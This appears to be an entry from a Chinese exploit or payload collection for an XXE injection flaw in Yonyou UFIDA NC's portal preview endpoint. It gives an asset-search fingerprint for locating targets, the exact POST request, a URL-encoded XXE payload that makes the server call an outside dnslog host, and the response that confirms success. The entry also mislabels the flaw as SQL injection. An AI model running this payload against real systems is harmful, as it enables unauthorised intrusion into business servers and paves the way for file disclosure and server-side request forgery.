# 用友-UFIDA-NCcontent存在XXE实体注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/page/preview/content?pageId=login HTTP/1.1`

**Payload**
```
page_xml=%253C%2521DOCTYPE%2Broot%2B%255B%2B%253C%2521ENTITY%2B%2525%2Bremote%2BSYSTEM%2B%2522http%253A%252F%252Fyazfhfyxoa.zaza.eu.org%252F%2522%253E%2B%2525remote%253B%255D%253E
```
- **响应特征**：200 dnslog回显